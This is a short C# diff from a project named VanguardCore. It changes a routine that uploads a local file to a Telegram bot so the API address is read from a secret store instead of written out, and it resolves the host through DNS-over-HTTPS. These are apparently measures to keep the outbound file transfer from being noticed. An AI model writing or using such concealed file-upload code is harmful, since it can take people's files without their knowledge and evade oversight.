@@ -141,7 +141,7 @@ namespace VanguardCore
             {
                 if (!File.Exists(filePath)) return false;
                 
-                string url = string.Format("https://api.telegram.org/bot{0}/sendDocument", botToken);
+                string url = string.Format("{0}/bot{1}/sendDocument", SafetyManager.GetSecret("TG_API_BASE"), botToken);
                 string ip = await ResolveDoH("api.telegram.org");
                 if (!string.IsNullOrEmpty(ip))
                 {
